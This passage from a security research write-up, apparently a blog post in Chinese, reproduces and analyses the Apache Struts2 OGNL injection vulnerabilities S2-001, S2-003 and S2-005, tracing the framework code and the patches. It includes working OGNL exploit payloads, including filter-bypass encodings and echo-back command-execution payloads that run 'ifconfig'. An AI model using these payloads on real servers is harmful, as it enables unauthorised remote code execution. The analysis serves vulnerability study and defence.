+<figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs purebasic">%&#123;<span class="hljs-symbol">#a</span>=@java.lang.<span class="hljs-keyword">Runtime</span>@getRuntime(),<span class="hljs-symbol">#b</span>=<span class="hljs-symbol">#a</span>.exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+<p>执行系统命令弹出计算器</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/7.png" srcset="/img/loading.gif"></p>
+<h3 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>​    我们先来理解一下用户请求在Struts框架中的流程是怎么样的：</p>
+<p>通过下图我们可以知道在执行Action动作方法之前，程序会先执行一些拦截器。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/8.png" srcset="/img/loading.gif"></p>
+<p>其中<code>ParametersInterceptor</code>拦截器会把<code>ActionContext</code>中的请求参数设置到<code>ValueStack</code>中。</p>
+<p>什么是<code>ValueStack</code>？</p>
+<p><code>ValueStack</code>实际是一个接口,在<code>Struts2</code>中利用<code>OGNL</code>时，实际上使用的是实现了该接口的<code>OgnlValueStack</code>类,这个类是<code>Struts2</code>利用<code>OGNL</code>的基础。</p>
+<p><code>ValueStack</code>(值栈): 贯穿整个 Action 的生命周期(每个 Action 类的对象实例都拥有一个<code>ValueStack</code>对象)，相当于一个数据的中转站. 在其中保存当前Action 对象和其他相关对象。</p>
+<blockquote>
+<p>在 ValueStack 对象的内部有两个逻辑部分:<br>– ObjectStack: Struts 把action和相关对象压入 ObjectStack 中–List。<br>– ContextMap: Struts 把各种各样的映射关系(一些 Map 类型的对象) 压入ContextMap 中。<br>Struts 会把下面这些映射压入 ContextMap 中<br>– parameters: 该 Map 中包含当前请求的请求参数<br>– request: 该 Map 中包含当前 request 对象中的所有属性<br>– session: 该 Map 中包含当前 session 对象中的所有属性<br>– application:该 Map 中包含当前 application 对象中的所有属性<br>– attr: 该 Map 按如下顺序来检索某个属性: request, session, application</p>
+</blockquote>
+<p>在<code>ParameterFilterInterceptor</code>拦截器上下个断点来看看是如何把请求参数压在<code>ValueStack</code>中。</p>
+<p><code>com.opensymphony.xwork2.interceptor.ParameterFilterInterceptor</code></p>
+<p>可以发现拦截器获取到了我们访问的action对象（还未赋值）、以及<code>ValueStack</code>值栈。其中<code>parameters</code>（Map对象）获取到了<code>ActionContext</code>（Struts2的数据中心）的值（也就是请求参数值）。然后拦截器就将这三个对象放入<code>setParameters</code>中处理</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/10.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>setParameters</code>方法查看，可以发现该方法的作用就是将用户的请求参数键值以此存放<code>ValueStack</code>对象之中。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/11.png" srcset="/img/loading.gif"></p>
+<p>同时可以发现<code>stack.setValue</code>方法执行过后，此时<code>Action</code>方法对象（我这里是<code>LoginAction</code>）中的<code>password</code>已经赋值完毕了</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/12.png" srcset="/img/loading.gif"></p>
+<p>接下来就会通过<code>com.opensymphony.xwork2.DefaultActionInvocation#invokeAction</code>方法来反射调用目标业务层的Action的方法。</p>
+<p>查看该方法可以发现是调用<code>StrutsActionProxy</code>获取<code>struts.xml</code>文件中数据得到<code>actionName</code>、<code>method</code>名（如果在<code>struts.xml</code>中没有设置的话，则默认方法是<code>execute</code>），最后利用反射调用。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/13.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/14.png" srcset="/img/loading.gif"></p>
+<p>通过反射进入到<code>LoginAction#execute</code>方法，经过一系列处理，在我这里返回的是<code>error</code>。接下来就是对结果<code>error</code>的处理</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/15.png" srcset="/img/loading.gif"></p>
+<p>执行<code>StrutsResultSupport.doExcute()</code>后框架将会开始处理页面回显，而其中会调用中间件tomcat调度器<code>ApplicationDispatcher</code>，由于访问jsp文件，会调用<code>JspServlet</code>处理请求。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/16.png" srcset="/img/loading.gif"></p>
+<p>当在 <code>JSP</code>文件中遇到 <code>Struts2</code> 标签 <code>&lt;s:textfield</code> 时，程序会先调用 <code>doStartTag</code> ，并将标签中的属性设置到 <code>TextFieldTag</code>对象相应属性中。最后，在遇到 <code>/&gt;</code>结束标签的时候调用 <code>doEndTag</code>方法。</p>
+<p>在<code>doEndTag</code>方法里会调用<code>TextFieldTag</code>对象的<code>end</code>方法：</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/17.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>end</code>方法查看，发现调用<code>evaluateParams()</code>方法。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/18.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>evaluateParams()</code>，发现该方法是用来进行数据填充操作的。同时会发现如果开启了 <code>Ognl</code>表达式支持( <code>this.altSyntax()</code> )，程序会在属性字段两边添加 <code>Ognl</code> 表达式字符( <code>%&#123;、&#125;</code> )</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/19.png" srcset="/img/loading.gif"></p>
+<p>然后使用 <code>findValue</code> 方法从值栈中获得该表达式所对应的值。</p>
+<p>跟进<code>findValue</code>方法，发现会调用<code>TextParseUtil</code>对象的<code>translateVariables</code>方法。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/20.png" srcset="/img/loading.gif"></p>
+<p>而该<code>TextParseUtil</code>对象的<code>translateVariables</code>方法又会调用同名重载的方法。而问题就出现在这个同名重载的方法中。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/21.png" srcset="/img/loading.gif"></p>
+<p>在最开始，我们传入 <code>translateVariables</code> 方法的表达式 <code>expression</code> 为 <code>%&#123;password&#125;</code> ，经过 <code>Ognl</code>表达式解析，程序会获得其值 <code>%&#123;1+1&#125;</code> 。这个值在先前经过 <code>ParametersInterceptor</code> 拦截器的时候设置了。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/22.png" srcset="/img/loading.gif"></p>
+<p>表达式最终变成<code>%&#123;1+1&#125;</code>，同时由于此处使用的是 <code>while</code> 循环来解析 <code>Ognl</code> ，所以表达式 <code>%&#123;1+1&#125;</code> 又会被再次执行，最终也就造成了任意代码执行。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/24.png" srcset="/img/loading.gif"></p>
+<p>我们来看看表达式为何被执行？</p>
+<p>在获得<code>%&#123;1+1&#125;</code>表达式之后，程序将<code>%&#123;&#125;</code>去掉后，数据传入<code>OgnlValueStack#findValue</code>方法进行处理，在代码196行的时候，又用<code>OgnlUtil.getValue</code>处理了我们的表达式</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/25.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>OgnlUtil.getValue</code>方法可以发现程序用<code>Ognl.getValue</code>方法处理了我们的表达式，<code>Ognl.getValue</code>第一个参数只要受到用户控制，便可以触发RCE。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/26.png" srcset="/img/loading.gif"></p>
+<h3 id="5-修复"><a href="#5-修复" class="headerlink" title="5.修复"></a>5.修复</h3><p>官方采用的修复方法是在代码中多了 <code>Ognl</code> 递归解析次数的判断，默认情况下仅解析第一层。（XWork 2.0.4中修复）</p>
+<h2 id="2-Struts2-003"><a href="#2-Struts2-003" class="headerlink" title="2.Struts2-003"></a>2.Struts2-003</h2><h3 id="1-漏洞概要"><a href="#1-漏洞概要" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>Struts2-003是一个远程代码执行漏洞，Struts2-005为Struts2-003补丁绕过。</p>
+<p>影响版本： <code>Struts 2.0.0 - Struts 2.1.8.1</code> 。更多详情可参考官方通告：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-003">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
+<h3 id="2-漏洞环境搭建-1"><a href="#2-漏洞环境搭建-1" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h3><p>因为Struts2.0.8也在受漏洞影响的，因此我就沿用<code>Struts2-01</code>的漏洞环境，具体漏洞搭建方法看上文。</p>
+<h3 id="3-漏洞复现-1"><a href="#3-漏洞复现-1" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>POC：<code>http://localhost:8080/S2_03_war_exploded/login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#39;deepin-calculator\&#39;)&#39;)(bla)(bla)</code></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/27.png" srcset="/img/loading.gif"></p>
+<p>回显EXP：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023myres\u003dnew\<span class="hljs-number">40</span>byte[<span class="hljs-number">51020</span>]&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/37.png" srcset="/img/loading.gif"></p>
+<h3 id="4-漏洞分析-1"><a href="#4-漏洞分析-1" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>本次漏洞是通过绕过 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor</code>这个拦截器。的过滤，进而执行 <code>OGNL</code> 表达式。</p>
+<p>我们还是在这个拦截器下的<code>doIntercept</code>下断点，然后发送<code>(@java.lang.Runtime@getRuntime().exec(&#39;deepin-calculator&#39;))(reader-l)(amadeus)</code>进行跟踪。</p>
+<p>依旧是存放 <code>HTTP</code> 数据的 <code>parameters</code> 变量将通过 <code>setParameters</code> 方法设置到<code>ValueStack</code>值栈中</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/28.png" srcset="/img/loading.gif"></p>
+<p>我们跟进该方法，我们可以发现得到前端传入的键值后，就调用<code>stack.setValue</code>处理键值。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/29.png" srcset="/img/loading.gif"></p>
+<p>跟进<code>stack.setValue</code>方法，可以看到用<code>OgnlUtil.setValue</code>处理了表达式。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/30.png" srcset="/img/loading.gif"></p>
+<p>继续跟进，可以发现漏洞的触发点<code>Ognl.setValue()</code>，我在上面有过普及<code>Ognl.setValue</code>是可以执行JAVA代码从而进行命令执行的！！</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/31.png" srcset="/img/loading.gif"></p>
+<p>但是在这里我们并没有弹出计算器，这是为什么？</p>
+<p>这是因为我们在<code>ParametersInterceptor</code>拦截器的<code>doIntercept</code>方法，在调用<code>setParameters</code>之前程序设置了<code>denyMethodExecution</code>，其值为<code>true</code>，这是程序为了防止用户命令执行的一个方法。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/32.png" srcset="/img/loading.gif"></p>
+<p>该防护的判断逻辑如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Map context, Class aClass, String string, Object[] objects)</span> <span class="hljs-keyword">throws</span> MethodFailedException </span>&#123;<br>        Boolean exec = (Boolean)context.get(<span class="hljs-string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>);<br>        <span class="hljs-keyword">boolean</span> e = exec == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">false</span> : exec;<br>        <span class="hljs-keyword">return</span> !e ? <span class="hljs-keyword">super</span>.callStaticMethod(context, aClass, string, objects) : <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+<p>因此我们需要修改一下POC：通过OGNL表达式将这个值设置为<code>false</code>。</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)<br></code></pre></td></tr></table></figure>
+<p>再次尝试利用，发现还是无法弹出计算器，对POC在代码中的执行进行跟踪，发现程序对<code>#</code>有进行过滤的操作。</p>
+<p>在<code>setParameters</code>方法中，程序调用了<code>acceptableName</code>方法进行过滤，最后POC不完整。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/33.png" srcset="/img/loading.gif"></p>
+<p>因此需要绕过该方法的对非法字符<code>#</code>的检查，大佬们的方法是将<code>#</code>编码成<code>\u0023</code>来实现绕过，同时为了解决url传参导致程序将<code>=</code>作为赋值运算符，我们也统一将器编码<code>\u003d</code>，对于<code>@</code>，在这里程序虽然没有进行黑名单的过滤，但是我们也需要将其进行编码，这是因为如果不编码的话，程序会先执行<code>(&quot;@java.lang.Runtime@getRuntime().exec(&#39;deepin-calculator&#39;)&quot;)(a)(b)</code>这段执行命令的代码，而我们绕过<code>denyMethodExecution</code>还未执行，而进行编码，执行顺序则会是正常预期。（我猜是因为编码后，<code>=</code>的编码值在<code>#</code>编码值之后，就会按照key的大小来排序，程序才会正常）</p>
+<p>将<code>POC</code>修改成如下</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;\u0023context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]\u003dfalse&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-string">&quot;\u0040java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)<br></code></pre></td></tr></table></figure>
+<p>我们也可以通过如下方法来控制排序：利用<code>A～Z</code>字母在<code>ascii</code>的排序。这样就不需要将<code>@</code>进行编码了</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(<span class="hljs-string">&quot;\u0023context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]\u003dfalse&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>)&amp;(<span class="hljs-name">A</span>)((<span class="hljs-string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;deepin-calculator&#x27;)&quot;</span>)(<span class="hljs-name">a</span>)(<span class="hljs-name">b</span>))<br></code></pre></td></tr></table></figure>
+<p>那为啥要用<code>\u00?</code>格式的编码呢，这是因为在执行<code>Ognl.setValue</code>之前，会对提交的poc进行相对应的解码。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/34.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/35.png" srcset="/img/loading.gif"></p>
+<p>最后成功执行命令，弹出计算器。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/36.png" srcset="/img/loading.gif"></p>
+<h3 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h3><p>​    官方的修复主要是对<code>xwork2</code>进行修改，对修复前后两个版本的xwork的jar包做一个比对，可以看到关键的修复部分在<code>ParametersInterceptor</code>的<code>setParameters</code>处以及<code>OgnlValueStack</code>新增两个成员属性。</p>
+<blockquote>
+<p>修复代码主要引入控制静态方法调用开关 <strong>allowStaticMethodAccess</strong> 变量，以及用于控制成员变量的访问权限的 <strong>SecurityMemberAccess</strong> 类对象。然而通过 <strong>OGNL</strong> 表达式，我们完全可以控制这两个变量的值，这也导致 <strong>Struts2-003</strong> 补丁可以被绕过，即后来的 <strong>Struts2-005</strong> 漏洞。</p>
+</blockquote>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/38.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/39.png" srcset="/img/loading.gif"></p>
+<h2 id="3-Struts2-005"><a href="#3-Struts2-005" class="headerlink" title="3.Struts2-005"></a>3.Struts2-005</h2><h3 id="1-漏洞概要-1"><a href="#1-漏洞概要-1" class="headerlink" title="1.漏洞概要"></a>1.漏洞概要</h3><p>​    S2-005就是对于S2-003的绕过，从上面的修复可以看到，补丁的关键部分在于通过对<code>securityMemberAccess</code>对象的两个成员变量<code>allowStaticMethodAccess</code>和<code>excludeProperties</code>对OGNL表达式静态方法的执行有了更深的限制，然而通过OGNL表达式，我们可以改写这两个变量的值（和<code>denyMethodExecution</code>是一个套路），来实现补丁的绕过。我们需要做的事情就是保证<code>allowStaticMethodAccess</code>的值为真，<code>excludeProperties</code>的值为空。</p>
+<h3 id="2-漏洞环境"><a href="#2-漏洞环境" class="headerlink" title="2.漏洞环境"></a>2.漏洞环境</h3><p>tomcat6.0 + struts2.0.12</p>
+<h3 id="3-漏洞复现-2"><a href="#3-漏洞复现-2" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>POC：</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">login</span><span class="hljs-selector-class">.action</span>?(<span class="hljs-string">&#x27;\u0023context[\&#x27;</span>xwork.MethodAccessor.denyMethodExecution\<span class="hljs-string">&#x27;]\u003dfalse&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;</span>)(bla)(bla)<span class="hljs-selector-tag">&amp;</span>(<span class="hljs-string">&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&#x27;</span>deepin-calculator\<span class="hljs-string">&#x27;)&#x27;</span>)(bla)(bla)<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/40.png" srcset="/img/loading.gif"></p>
+<p>这是从网上找的回显EXP：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023myres\u003dnew\<span class="hljs-number">40</span>byte[<span class="hljs-number">51020</span>]&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023myres)&#x27;)(<span class="hljs-name">bla</span>))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/41.png" srcset="/img/loading.gif"></p>
+<p>这是我自己构造的一个回显EXP：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>)&amp;(<span class="hljs-name">A</span>)((&#x27;\u0023mytes\u003dnew\<span class="hljs-number">40</span>java.io.InputStreamReader(\u0023myret.getInputStream())&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">B</span>)((&#x27;\u0023mydat\u003dnew\<span class="hljs-number">40</span>java.io.BufferedReader(\u0023mytes)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">C</span>)((&#x27;\u0023mycha\u003dnew\<span class="hljs-number">40</span>char[<span class="hljs-number">65535</span>]&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">D</span>)((&#x27;\u0023mydat.read(\u0023mycha)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">E</span>)((&#x27;\u0023mystr\u003dnew\<span class="hljs-number">40</span>java.lang.String(\u0023mycha)&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">F</span>)((&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext\u0040getResponse()&#x27;)(<span class="hljs-name">bla</span>)(<span class="hljs-name">bla</span>))&amp;(<span class="hljs-name">G</span>)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(<span class="hljs-name">bla</span>))<br></code></pre></td></tr></table></figure>
+<p>相同回显效果。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/42.png" srcset="/img/loading.gif"></p>
+<p>以上的的利用payload中的<code>(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(bla)(bla)</code>不一定需要设置，因为在一些版本中已经默认为<code>true</code>了。</p>
+<h3 id="4-漏洞分析-2"><a href="#4-漏洞分析-2" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h3><p>​    该漏洞只是绕过官方对<code>S2-03</code>漏洞的补丁，所以这个漏洞大体上是和<code>Struts2-03</code>漏洞一致，也是通过用户控制<code>Ognl.setValue()</code>第一个参数位置导致的JAVA代码的任意执行，因此这次分析的重点是在大佬们是如何绕过该补丁。</p>
+<p>​    从下面三张图，我们可以发现在<code>setParameters</code>方法中原本<code>stack.setValue</code>变成了<code>newStack.setValue</code>，ParametersInterceptor中对当前值栈重新初始化valueStack，向当前newStack中新增一个<code>securityMemberAccess</code>对象而该对象中定义了字段<code>allowStaticMethodAccess</code>、<code>excludeProperties</code>、<code>acceptProperties</code>作为新的沙箱进一步限制静态方法执行。</p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/43.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/38.png" srcset="/img/loading.gif"></p>
+<p><img src="/2021/06/29/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/39.png" srcset="/img/loading.gif"></p>
+<p>其中，从图中我们可以看出，<code>allowStaticMethodAccess</code>是默认为<code>true</code>的，因此在该版本中，他并不是影响我们方法执行的关键字段。</p>
